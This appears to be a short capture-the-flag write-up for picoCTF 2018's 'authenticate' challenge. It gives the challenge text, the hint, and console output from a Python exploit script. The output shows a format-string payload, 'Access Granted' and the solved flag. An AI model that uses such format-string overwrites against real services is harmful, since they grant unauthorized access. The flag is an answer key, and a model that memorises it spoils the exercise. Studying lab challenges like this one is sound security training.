# authenticate - Points: 350 - (Solves: 216)

Can you [authenticate][1] to this service and get the flag?
Connect with nc 2018shell2.picoctf.com 26336.
Source.

[1]: https://2018shell2.picoctf.com/static/0d2b632a56e821f0030f2b382492cc94/auth
[2]: https://2018shell2.picoctf.com/static/0d2b632a56e821f0030f2b382492cc94/auth.c

## Hints

What happens if you say something OTHER than yes or no?

---

```sh
% python xpwn.py
[+] Opening connection to 2018shell2.picoctf.com on port 26336: Done
[+] Receiving all data: Done (341B)
[*] Closed connection to 2018shell2.picoctf.com port 26336
Received Unknown Input:

L\xa0\x0M\xa0\x0N\xa0\x0O\xa0\x0                                                                                                                                                                                                                                              \xa6
Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91}
```
